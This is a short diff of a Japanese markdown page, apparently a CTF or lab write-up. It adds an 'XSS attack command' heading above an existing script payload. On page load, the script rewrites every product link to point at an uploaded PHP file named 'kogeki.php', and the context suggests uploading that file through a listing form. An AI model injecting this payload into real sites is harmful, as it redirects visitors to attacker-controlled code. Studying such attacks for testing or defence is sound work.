@@ -122,7 +122,7 @@ phpを出品画面でアップして、
 それぞれのリンク先を強制的にそのphpにすれば何かできるかも...？
 :::
 
-
+##XSS攻撃コマンド
 ```html:リダイレクト先変更
 <script>document.addEventListener('DOMContentLoaded',function(){var e=document.querySelectorAll('.product-item');e.forEach(function(e){var t=e.querySelector('a');t&&(t.href='images/kogeki.php   ',console.log('リンクのhref属性を変更しました:',t.href))})});</script>
 ```
